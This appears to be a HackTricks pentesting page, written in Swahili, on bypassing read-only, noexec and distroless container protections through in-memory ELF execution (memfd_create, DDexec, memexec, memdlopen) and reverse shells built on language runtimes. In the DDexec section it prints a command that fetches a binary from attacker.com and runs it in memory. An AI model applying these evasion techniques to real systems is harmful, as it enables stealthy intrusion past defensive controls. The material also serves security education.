# Bypass FS protections: read-only / no-exec / Distroless

## Video

Katika video zifuatazo, unaweza kupata maelezo ya kina zaidi kuhusu techniques zilizotajwa kwenye ukurasa huu:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## hali ya read-only / no-exec

Kwenye container, unaweza kuweka root filesystem kuwa read-only kwa kuweka **`readOnlyRootFilesystem: true`** kwenye security context.<sup>[[3]](#references)</sup> Kwa mfano:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Root iliyo read-only haifanyi volumes zilizomountiwa kando ziwe read-only. Docker huchukulia **`/dev/shm`** kama IPC mount, huku chaguo za tmpfs kama `rw` na `noexec` zikiwa mipangilio ya runtime; kagua mount options za container lengwa kabla ya kutegemea tabia yoyote kati ya hizo.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Kwa mtazamo wa red-team, mchanganyiko huo unaweza kufanya iwe vigumu kudownload na kuexecute binaries ambazo hazipatikani tayari (kwa mfano, backdoors au enumeration tools).<sup>[[4]](#references)[[5]](#references)</sup>

## Bypass rahisi zaidi: Scripts

Mount ya `noexec` huzuia execution ya moja kwa moja ya binaries kwenye mount hiyo, lakini interpreter bado inaweza kusoma na kutafsiri script. Ikiwa `sh` au `python` ipo, unaweza hivyo kuendesha shell au Python script kupitia interpreter hiyo.<sup>[[5]](#references)</sup>

Hii haisaidii wakati tool inayohitajika yenyewe ni binary.<sup>[[5]](#references)</sup>

## Memory Bypasses

Wakati execution ya moja kwa moja kutoka kwenye path iliyomountiwa imezuiwa, chaguo moja ni kupakia ELF kwenye memory na kuiendesha kupitia in-memory path. Hii huepuka ukaguzi wa `noexec` kwenye mount hiyo, lakini haiondoi controls nyingine za kernel, permissions, au policy.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

Ikiwa scripting runtime inaweza kufikia Linux interface husika, inaweza kuunda file descriptor isiyo na jina, inayotegemea RAM, kwa kutumia **`memfd_create(2)`**, kuandika ELF bytes ndani yake, na kutumia execution path inayotegemea fd. Project ya [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) huzalisha code ya Python, Perl, au Ruby iliyocompressiwa na kuencodewa kwa base64 kwa workflow hii.<sup>[[6]](#references)[[7]](#references)</sup>

Project hii kwa sasa inaeleza targets za Python, Perl, na Ruby; PHP au Node zinahitaji technique au extension tofauti inayotegemea runtime, kwa hiyo kutokuwepo kwa generator hii kwa language fulani hakumaanishi kuwa in-memory execution haiwezekani.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Executable ya kawaida iliyoandikwa kwenye **`/dev/shm`** bado iko chini ya setting ya **`noexec`** ya mount hiyo; kuifungua tu kupitia ordinary file descriptor hakubadilishi mount policy.<sup>[[5]](#references)</sup>
>
> Njia halisi ya memory-execution pia hutegemea runtime, architecture, kernel, na permissions zinazopatikana.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) huandika stager na loader ndani ya shell process inayoendelea kupitia **`/proc/self/mem`**, kisha huhamisha control kwenda kwenye code hiyo.<sup>[[8]](#references)</sup>

Hii huwezesha process kupakia binary iliyotolewa bila kwanza kuiweka binary hiyo kwenye executable filesystem.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** inaweza kupakia na **execute** shellcode au binary kutoka **memory**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Kwa maelezo zaidi kuhusu technique hii, angalia Github au:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ni utekelezaji wa DDexec unaoendeshwa kama daemon. Daemon yake husikiliza maombi yenye arguments na raw program bytes, hufanya fork ya child ili kupakia na kuendesha kila program, na huacha parent ikiwa server.<sup>[[9]](#references)</sup>

Repository ina mfano wa kutumia **memexec kuendesha binaries kutoka kwenye PHP reverse shell** katika [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Ikiwa na lengo linalofanana na DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) ni utekelezaji wa `dlopen()` usiotumia file kwa shared object au program. README yake kwa sasa inaeleza support ya ARM64, kwa hiyo kagua target architecture kabla ya kuitumia.<sup>[[10]](#references)</sup>

## Distroless Bypass

Kwa maelezo maalumu ya **distroless ni nini hasa**, inasaidia wakati gani, haisaidii wakati gani, na jinsi inavyobadilisha post-exploitation tradecraft kwenye containers, angalia:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless ni nini

Distroless images zina application pekee pamoja na runtime dependencies zake; official images huacha package managers, shells, na programs nyingine zinazotarajiwa katika Linux distribution ya kawaida.<sup>[[11]](#references)</sup>

Kuweka runtime image ikiwa na dependencies hizo pekee hupunguza software iliyopo production na kiasi kinachopaswa kuscaniwa na kufuatiliwa.<sup>[[11]](#references)</sup>

### Reverse Shell

Katika distroless container huenda **usipate `sh` au `bash`** kwa ajili ya shell ya kawaida, wala utilities za kawaida kama `ls`, `whoami`, au `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Kwa hiyo, reverse shell ya kawaida inayotegemea shell au enumeration inayotegemea utilities huenda isifanye kazi.<sup>[[11]](#references)</sup>

Ikiwa application iliyoathiriwa ina language runtime (kwa mfano, Python kwa Flask application au Node.js kwa Node application), RCE bado inaweza kutumia runtime hiyo kuunda command channel na kukagua system kupitia APIs zake.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Tumia scripting language iliyopo **ku-enumerate system** kupitia uwezo wa language hiyo.<sup>[[12]](#references)</sup>

Ikiwa hakuna protections za **read-only/no-exec**, command channel inaweza kuandika binaries kwenye writable, executable mount na kuziendesha; thibitisha mount options na permissions kwanza.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Protections hizi zikiwa zipo, tumia **memory-execution techniques zilizo hapo juu** pale runtime, kernel, na permissions zinaporuhusu.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Unaweza kupata **mifano** ya kutumia RCE vulnerabilities kupata **reverse shells** za scripting language na kuendesha binaries kutoka memory katika [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Kuchunguza Udanganyifu wa Linux Memory kwa Stealth na Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Kusanidi Security Context kwa Pod au Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
